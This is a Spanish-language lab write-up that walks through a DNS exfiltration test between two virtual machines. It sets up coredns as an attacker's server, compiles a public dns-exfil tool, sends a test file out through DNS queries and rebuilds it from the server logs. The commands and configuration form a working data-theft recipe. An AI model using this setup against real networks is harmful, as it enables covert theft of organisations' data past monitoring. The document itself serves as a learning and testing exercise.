# Prueba de exfiltración DNS



## Escenario

2 máquinas virtuales:

- `DNS_Client`: Máquina infectada que hará las peticiones DNS para exfiltrar los datos al servidor.
- `DNS_Server`: Servidor del atacante que recibirá las peticiones DNS y reconstruirá el fichero exfiltrado a través de los logs de las peticiones recibidas.

**_NOTA_**: Las 2 máquinas virtuales estarán en la misma red interna, en un escenario más realista deberían de estar en redes distintas, `DNS_Client` es la máquina infectada y debería de estar dentro de la red de la organización atacada, por otro lado, `DNS_Server` debería de estar en una red privada del atacante, lo más oculta posible.

### Configuración_DNS_Client_

Dirección IP estática: 192.168.1.10
Servidor DNS: 192.168.1.100

#### Configuración de la herramienta de exfiltración

Clonamos el repositorio con la [herramienta de exfiltración](https://github.com/62726164/dns-exfil) y compilamos su módulo `send`, este módulo enviar ficheros a través de peticiones DNS, coge los bytes del fichero y envía estos bytes a través de peticiones DNS, tantas como haga falta dependiendo del tamaño del fichero:

```shell
git clone https://github.com/62726164/dns-exfil
cd send
make
```



### Configuración _DNS_Server_

Dirección IP: 192.168.1.100

#### Configuración servidor DNS

Primero desactivamos el servicio DNS de systemd (DNS por defecto):

```shell
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
```

Vamos a configurar un servidor DNS con [coredns](https://coredns.io/), para ello clonamos su repositorio y lo compilamos:

```shell
git clone https://github.com/coredns/coredns
cd coredns
make
```

Ahora creamos el fichero de configuración `Corefile` con el siguiente contenido:

```shell
dns://exfil.go350.com {
	any
	log
}
```
Estamos indicando que el servidor atenderá a todas las peticiones DNS que reciba para el dominio exfil.go350.com, por el puerto 53 y solo DNS, en este caso no atiende DNS sobre TLS (habría que especificar `tls://exfil.go...`).  A esas peticiones responderá una respuesta corta genérica `any`, para no devolver un error, y mostrará un `log` de la petición por la salida estándar.



#### Configuración de la herramienta de exfiltración

Clonamos el repositorio con la [herramienta de exfiltración](https://github.com/62726164/dns-exfil) y compilamos su módulo `recv`, este módulo es el que se encarga de recibir peticiones DNS y reconstruir ficheros en base a los logs de estas peticiones:

```shell
git clone https://github.com/62726164/dns-exfil
cd recv
make
```



## Ejecución 

Iniciamos el servidor DNS en `DNS_Server`, vamos a redirigir la salida estándar a un fichero de log, que será el que utilicemos después para reconstruir el fichero exfiltrado:

```shell
./coredns | grep --line-buffered INFO > /tmp/dns-exfil/dns-log/exfiltrated.log
```



Desde `DNS_Client` creamos el fichero `exfiltrated-data` que va a ser exfiltrado:

```shell
Este es un fichero que va a ser exfiltrado a través de DNS al servidor DNS 192.168.1.100.
```

**_NOTA_**: En un escenario real, `exfiltrated-data` sería información relevante o que es importante ocultar, para la organización atacada.



Una vez creado, lo enviamos mediante peticiones DNS a través de la [herramienta de exfiltración](https://github.com/62726164/dns-exfil):

```shell
./send -d -file ../test-files/exfiltrated-data -marker prueba
```



Desde `DNS_Server` reconstruimos el fichero a partir de los logs de las peticiones recibidas:

```shell
./recv -d -qlog ../dns-log/exfiltrated.log -marker prueba
```

En pantalla podremos ver los logs que se han procesado y el contenido del fichero `exfiltrated-data` reconstruido.



## Herramientas utilizadas

- [`dnscore`](https://github.com/coredns/coredns): Servidor DNS utilizado, también se podría utilizar `bind9`.
- [`dns-exfil`](https://github.com/62726164/dns-exfil): Herramienta de exfiltración DNS utilizada.
